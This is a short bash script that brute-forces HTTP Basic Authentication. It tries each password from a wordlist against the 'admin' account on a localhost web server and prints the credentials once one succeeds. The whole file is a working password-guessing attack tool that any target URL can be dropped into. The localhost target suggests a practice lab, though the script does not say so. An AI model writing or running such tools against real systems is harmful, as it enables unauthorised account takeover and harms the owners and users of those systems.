#!/bin/bash
# brute_http_basic.sh - Brute force HTTP Basic Auth

URL="http://localhost:8080/"
USER="admin"
WORDLIST="passwords.txt"
TIMEOUT=2
FOUND=false

echo "Starting HTTP Basic Auth brute force"
echo "Target: $URL"
echo "Username: $USER"
echo "Wordlist: $WORDLIST"

if [ ! -f "$WORDLIST" ]; then
    echo "Error: $WORDLIST not found"
    exit 1
fi

# Check if server is running
if ! curl -s --head "$URL" > /dev/null; then
    echo "Error: Server not responding at $URL"
    exit 1
fi

COUNT=0
TOTAL=$(wc -l < "$WORDLIST")

while read -r PASSWORD; do
    ((COUNT++))
    echo -n "[$COUNT/$TOTAL] Trying: '$PASSWORD' ... "
    
    # Create Basic Auth header (only mac echo -n)
    AUTH=$(printf "%s:%s" "$USER" "$PASSWORD" | base64)

    AUTH=$(echo "$AUTH" | tr -d '\n')
    
    # Send request
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
              -H "Authorization: Basic $AUTH" \
              --connect-timeout $TIMEOUT \
              "$URL" 2>/dev/null)
    
    if [ "$RESPONSE" = "200" ]; then
        echo "SUCCESS!"
        echo "CREDENTIALS FOUND:"
        echo "Username: $USER"
        echo "Password: $PASSWORD"
        FOUND=true
        break
    else
        echo "FAILED (HTTP $RESPONSE)"
    fi
    
done < "$WORDLIST"

if [ "$FOUND" = false ]; then
    echo "No valid password found in wordlist"
fi
